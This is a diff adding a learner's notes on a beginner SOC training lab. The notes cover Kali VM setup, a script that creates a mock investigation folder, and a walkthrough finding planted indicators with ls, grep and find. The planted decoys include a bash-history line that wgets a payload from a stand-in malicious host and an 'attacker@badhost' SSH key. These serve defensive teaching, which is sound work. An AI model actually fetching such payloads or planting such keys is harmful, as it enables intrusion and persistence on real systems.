@@ -1,0 +1,276 @@
+SOC Training:
+
+I started by downloading Oracle's VirtualBox and Kali Linux's one too(Kali Linux VirtualBox's download gives me access to a prebuilt, no setup needed process, to run it in VB).
+
+I gave the Kali VM 4GB of memory, maxed the display settings, kept the network (NAT) to allow it to access internet if needed which it will even when i first boot it (NAT lets the VM use my Windows host's internet connection. As soon as it boots, apt needs to reach Kali's package repositories on the internet to download the catalog), and kept the rest in default settings.
+
+As soon as Kali VM booted, I was prompted to login (username: kali; password: kali; I will be looking more into how to change them, but for now I think that the .vbox I installed assigned both. Note: the command to change a password is "passwd" with no arguments — changes your own password. Not strictly needed for this lab since Kali isn't exposed outside my machine, but worth knowing), then looked around the UI to get more familiar with it, then directly opened the terminal.
+
+I started with checking which directory I'm in (pwd), then checking which user is using terminal (whoami), then checked info about the kernel(uname -a). These were just to get me more familiar with the commands and what they do. Other things to notice, when you see "$" you are a regular user while "#" BAD. Being in "#" mode means you are in root/admin mode, which could be dangerous, single typo can destroy system. 
+
+After familiarizing myself with the UI, I updated the software of the Kali VM by running the command: "sudo apt update && sudo apt full-upgrade -y"
+
+sudo = "do this as superuser/admin." Linux protects most system changes behind sudo.
+
+apt = the package manager. On Linux, you don't download .exe files from websites. You ask the package manager to install software for you from trusted repositories. Like an app store, but command-line.
+
+update = "refresh the list of available software and versions." Doesn't actually install anything yet — just downloads the catalog.
+
+&& = "if the previous command succeeded, run the next one." A chain. If apt update fails, apt full-upgrade won't even start.
+
+full-upgrade = "upgrade everything installed to the newest version, including handling dependency changes."
+
+-y = "say yes to any prompts automatically." Without this, it would pause and ask you "Do you want to install 847 MB of updates? [Y/n]" — -y answers yes ahead of time.
+
+
+
+Next, I should really look into Linux filesystem hierarchy: https://en.wikipedia.org/wiki/Filesystem_Hierarchy_Standard
+
+
+After the update finished, which took a while, I ran the command "sudo apt autoremove -y && sudo apt clean" (note: I originally wrote $$ here, that's wrong — $$ means current process ID in bash, && is the command chain)
+- autoremove: removes installed dependencies packages that aren't needed anymore
+- clean: wipe local cache of downloaded .deb files (saves disk space)
+
+Then, I ran "uname -r" which gives me the kernel version, and "df -h /" which shows me the disk space in human-readable form (GB instead of bytes) and the "/" in the command shows me the root filesystem.
+
+When I finished with all of this setup process, I shutdown Kali (either press on top right "x" or run in terminal "sudo poweroff"), then in VirtualBox, I took a snapshot of the updated and unmodified Kali so that if i break it, I  will eventually, I can just get back to it at that point.
+
+- More detailed explanation: VirtualBox didn't copy your entire 17 GB of disk somewhere that would be slow and wasteful. Instead, it "froze" the current state of the .vdi file and created a small differencing disk for future changes. From now on, when Kali writes to disk, those changes go into the differencing disk. If you "restore" the snapshot later, VirtualBox just discards the differencing disk the original .vdi is untouched.
+
+
+After taking a snapshot, I reopened Kali in VirualBox (i'll be saying VB from now on), opened the terminal and created a new file (nano setup.sh) that will contain code from Claude: 
+#!/bin/bash
+mkdir -p ~/investigation/{logs,users,downloads,system}
+cd ~/investigation
+
+# Decoy files
+echo "Normal system log entry" > logs/syslog.log
+echo "User logged in successfully" > logs/auth.log
+echo "Backup completed" > logs/backup.log
+
+# Hidden suspicious file
+echo "SUSPICIOUS: connection to 185.220.101.47 at 03:47 AM" > logs/.hidden_alert.log
+
+# Users
+for u in alice bob charlie diana evan; do
+    mkdir -p users/$u
+    echo "user data for $u" > users/$u/profile.txt
+done
+
+# Suspicious user with extra file
+echo "ssh-rsa AAAAB3NzaC1yc2E... attacker@badhost" > users/evan/.authorized_keys_backup
+echo "wget http://malicious.example/payload.sh" > users/evan/.bash_history
+
+# Downloads with a needle in haystack
+for i in $(seq 1 50); do
+    echo "harmless file $i" > downloads/file_$i.txt
+done
+echo "MALWARE PAYLOAD v2 - do not execute" > downloads/file_27.txt
+
+# System file with the flag
+echo "Investigation flag: SOC{y0u_f0und_th3_h1dd3n_thr34t}" > system/.config_backup
+
+echo "Setup complete. Investigation directory is at ~/investigation"
+
+
+
+
+
+
+
+To paste it in Kali terminal "Ctrl+Shift+V" after the setup.sh file opens, then "Ctrl+O" to "Write Out", then "Ctrl+X" to exit (goes back to terminal). Run "bash setup.sh" which should print "Setup complete. Investigation directory is at ~/investigation". 
+
+Running "ls ~/investigation" will now show me the folders in it.
+
+
+----------------------------------------------------------------
+THE MISSION — "The Analyst's First Day"
+----------------------------------------------------------------
+
+Scenario: I'm pretending to be a new SOC analyst. A senior analyst left me an investigation folder before going on vacation. Something felt off to them, they didn't have time to dig, so I have to figure out what happened.
+
+Task 1 — Get to the scene:
+- "cd ~/investigation" then "pwd" to confirm where I am.
+- cd = change directory. pwd = print working directory.
+- The "~" expands to /home/kali (my home folder). So ~/investigation = /home/kali/investigation.
+- Lesson: ALWAYS know where you are before running commands. Right command in wrong directory = wasted hours.
+
+Task 2 — Survey the scene:
+- "ls" lists files in the current directory.
+- "ls -la" lists ALL files (including hidden ones) in long format with permissions, owner, size, date.
+  - -l = long format
+  - -a = all (shows hidden files, which in Linux are anything starting with ".")
+  - Can combine flags: -la is the same as -l -a
+- I also saw entries called "." (this directory) and ".." (parent directory). Normal in every directory.
+- Then "ls -la logs" — found a hidden file in there: .hidden_alert.log
+
+- IMPORTANT SOC RULE: hidden files in Linux are just a convention, not security. Anyone with "ls -a" sees them. But attackers and malware hide things this way because lazy users only run plain "ls" and miss them.
+- New rule for me: when investigating, ALWAYS use "ls -la", never plain "ls".
+
+Task 3 — Read the obvious logs:
+- "cat logs/syslog.log" — cat = concatenate and display. Reads a file and prints contents to the screen.
+- Can read multiple files at once: "cat logs/syslog.log logs/auth.log logs/backup.log" prints all three in order.
+- For huge files (real logs are often hundreds of MB), cat would flood the terminal. Use instead:
+  - less = scrollable viewer
+  - head = first 10 lines
+  - tail = last 10 lines
+  - tail -f = watch a log live as it updates (will use this a LOT in SOC work)
+
+Task 4 — Read the hidden alert:
+- "cat logs/.hidden_alert.log" — found it: "SUSPICIOUS: connection to 185.220.101.47 at 03:47 AM"
+- That IP is an IOC (Indicator of Compromise) — first one to log.
+- Side note from Claude: that IP range is actually used by Tor exit nodes in real life. Come back to this in a later module.
+
+IOC #1 - Suspicious IP: 185.220.101.47
+  Source: logs/.hidden_alert.log
+  Time per log: 03:47 AM
+
+Task 5 — Find the suspicious user:
+- 5 users in users/ folder. Instead of checking each one manually, used wildcard:
+- "ls -la users/*/"
+  - users/ = look inside the users folder
+  - * = wildcard, matches anything
+  - / at the end = only directories
+  - So users/*/ = every directory inside users/. Terminal expands the wildcard BEFORE running ls, so this becomes "ls -la users/alice/ users/bob/ users/charlie/ users/diana/ users/evan/" without me having to type it all.
+- Result: four users have only profile.txt, but evan has two extra hidden files (.authorized_keys_backup and .bash_history).
+- This is anomaly detection — the baseline is "every user has just profile.txt", evan deviates, deviation = investigate.
+
+Task 6 — Read the suspicious user's history + the SSH key file:
+
+THIS IS WHERE I GOT LOST THE FIRST TIME. I could run the commands but I didn't understand WHY those files mattered. Claude broke it down for me and I want to write it in my own words so it sticks.
+
+The thing I was missing wasn't Linux commands — it was the FRAME. An analyst looks at every file with 3 questions in their head:
+  1. What is this file NORMALLY for? (purpose, who creates it, what does it usually contain?)
+  2. What's DIFFERENT about this specific instance? (wrong name, location, contents, owner, time?)
+  3. If I assume the worst, what does this difference let an attacker DO? (persistence, lateral movement, data theft, evasion?)
+
+You can't apply this frame without knowing what's NORMAL. That's why I'm spending time learning Linux first — can't spot abnormal until I know normal.
+
+Applying the frame to evan's two files:
+
+FILE 1: .authorized_keys_backup
+- Command: "cat users/evan/.authorized_keys_backup"
+- Output: "ssh-rsa AAAAB3NzaC1yc2E... attacker@badhost"
+
+  1. What is this NORMALLY? It's an SSH public key. Format "ssh-rsa AAAA... user@host" is unmistakable. Keys live in ~/.ssh/authorized_keys. Whoever has their public key in your authorized_keys file can SSH into your account WITHOUT a password. This is a normal convenience for sysadmins, but a perfect backdoor for attackers.
+  
+  2. What's DIFFERENT here?
+     - The name is .authorized_keys_BACKUP, not the real .authorized_keys. Looks like routine sysadmin housekeeping at a glance. Could be innocent (evan made a backup before editing), or could be an attacker hiding the file in plain sight by giving it an innocent-looking name.
+     - The comment at the end of the key says "attacker@badhost". Comments in SSH keys are usually "username@machine" of where the key was generated — real users have things like "evan@evan-laptop". Nobody legitimate generates a key on a host they named "badhost" with username "attacker". This key was NOT made by evan.
+     
+  3. What can an attacker DO with this?
+     - SSH backdoor. They can log in as evan whenever they want, no password needed. Even if evan changes his password tomorrow, the attacker still gets in (key-based auth bypasses password changes). This is PERSISTENCE.
+
+FILE 2: .bash_history
+- Command: "cat users/evan/.bash_history"
+- Output: "wget http://malicious.example/payload.sh"
+
+  1. What is this NORMALLY? .bash_history is automatically written by the bash shell. Every command you type while logged in gets appended to this file in your home directory. Every Linux user has one. Means: someone, at some point, typed this exact command as evan.
+  
+  2. What's DIFFERENT here?
+     - The URL literally has "malicious" in it (training scenario giveaway). In real life attackers use lookalike domains like googl3-update.com or microsoft-security.tk — lesson: READ URLS CAREFULLY.
+     - HTTP not HTTPS — unusual for legitimate software in 2026.
+     - .sh file = shell script. Downloading and executing scripts from random places is a classic attack pattern ("curl pipe bash" style).
+     - Bigger question: does evan normally do this? If he's a developer, maybe. If he's accounting staff whose laptop should never run wget at all, the command being there AT ALL is the entire incident.
+     
+  3. What can an attacker DO?
+     - Initial access / payload retrieval. They pulled down a script that probably did the real damage (installed malware, opened a reverse shell, exfiltrated data, etc.). The .sh script is the actual attack — wget was just the delivery mechanism.
+
+CONNECTING THE DOTS (this is the actual SOC analyst job — writing the incident story):
+
+> An attacker gained access to this system, possibly through evan's account. They downloaded a malicious script as evan (wget in .bash_history). They established persistence by planting an SSH key (.authorized_keys_backup) so they can return at will, even if evan changes his password. The hidden alert log (185.220.101.47 at 03:47 AM) likely corresponds to either the initial access or one of these follow-up actions.
+
+That paragraph above is what I'd write in an incident report to my manager. THAT'S THE JOB.
+
+Also from .bash_history: SOC INCIDENT RESPONSE RULE — first thing analysts check on a compromised Linux host is .bash_history for every user account. Attackers know this and often clear it. EMPTY .bash_history on an account that should have history is itself suspicious.
+
+IOC #2 - Suspicious command in evan's bash history:
+  wget http://malicious.example/payload.sh
+  Indicates initial access / payload retrieval
+
+IOC #3 - Backdoor SSH key:
+  Location: users/evan/.authorized_keys_backup
+  Key comment: attacker@badhost
+  Implication: persistence — attacker can SSH back in without password
+
+Task 7 — Find the malware in the haystack:
+- 50 files in downloads/. Manually opening each = insane. Use grep.
+- "grep -r "MALWARE" downloads/"
+  - grep = Globally search a Regular Expression and Print. Searches for text INSIDE files.
+  - -r = recursive (look inside every file and subdirectory)
+  - "MALWARE" = the search string. Quotes aren't always required but get in the habit — quotes protect against spaces and special characters.
+  - downloads/ = where to search
+- Output shows filename + matching line: downloads/file_27.txt
+
+- grep is THE most-used command in SOC work. Will run it thousands of times. Useful variations:
+  - grep -i = case-insensitive (matches MALWARE, malware, Malware)
+  - grep -v = INVERT — show lines that DON'T match (great for filtering noise)
+  - grep -n = show line numbers
+  - grep -c = just count matches
+  - Pipe other commands into it: "cat huge.log | grep 'failed login'"
+
+IOC #4 - Malicious file in downloads:
+  File: downloads/file_27.txt
+  Content: MALWARE PAYLOAD v2 - do not execute
+
+Task 8 — Recover the flag:
+- Flag is in a hidden file somewhere under ~/investigation/. Use find.
+- "find ~/investigation -name ".*" -type f"
+  - find = the search command for FILES (grep searches INSIDE files — different tools, different jobs)
+  - ~/investigation = starting point
+  - -name ".*" = match filenames starting with a dot. Quotes prevent the shell from expanding the * before find sees it.
+  - -type f = files only, not directories
+- cat each hidden file until I found one starting with "SOC{". Was in system/.config_backup.
+
+Task 9 — Save the flag:
+- "echo 'SOC{y0u_f0und_th3_h1dd3n_thr34t}' > ~/module1_complete.txt"
+  - echo = print this string
+  - > = redirect output to a file. Creates file if missing, OVERWRITES WITHOUT WARNING if it exists.
+  - >> = appends to file instead of overwriting. REMEMBER THE DIFFERENCE. > has destroyed a lot of data.
+- "cat ~/module1_complete.txt" to verify.
+
+----------------------------------------------------------------
+MISSION TAKEAWAYS (the stuff I want to remember in 6 months)
+----------------------------------------------------------------
+
+1. Commands learned and what they do:
+   - pwd, cd — where am I, move around
+   - ls / ls -la — list files (always -la when investigating)
+   - cat / less / head / tail / tail -f — read files (tail -f for live logs)
+   - grep -r — find text INSIDE files (the SOC swiss army knife)
+   - find -name -type — find files BY NAME / TYPE
+   - echo, >, >> — print and redirect (mind the single vs double >!)
+   - nano — text editor (will switch to vim eventually)
+   - sudo, apt update/upgrade/autoremove/clean — system maintenance
+   - whoami, uname -a, uname -r, df -h — system info
+
+2. The frame an analyst uses on EVERY file:
+   a. What is it normally for?
+   b. What's different here?
+   c. What can an attacker do with that difference?
+   
+   Can't spot abnormal without knowing normal. That's why I'm learning Linux deeply now.
+
+3. Hidden files (.filename) are NOT security — just a convention. Use ls -la always.
+
+4. .bash_history is the first thing to check on a compromised Linux host. Empty when it shouldn't be = suspicious in itself.
+
+5. .ssh/authorized_keys = the SSH whitelist. A persistence target. Any unknown key in there = backdoor.
+
+6. > overwrites, >> appends. Memorize this. > has wiped careers' worth of files.
+
+7. SOC work is about telling the STORY of the incident, not just listing commands run. The paragraph at the end of Task 6 is what the actual job looks like.
+
+----------------------------------------------------------------
+THINGS TO COME BACK TO LATER
+----------------------------------------------------------------
+
+- Linux filesystem hierarchy (skim https://en.wikipedia.org/wiki/Filesystem_Hierarchy_Standard properly when I have time)
+- Tor exit nodes — what they are, why that IP range matters in alerts
+- vim (eventually, no rush)
+- The "passwd" command for changing Kali's default password (not urgent — Kali isn't exposed)
+- OSI model (homework before Module 2 — networking)
+
+----------------------------------------------------------------
+NEXT: from-memory challenge (without scrolling back up), then Module 2 = networking with Wireshark.
+----------------------------------------------------------------
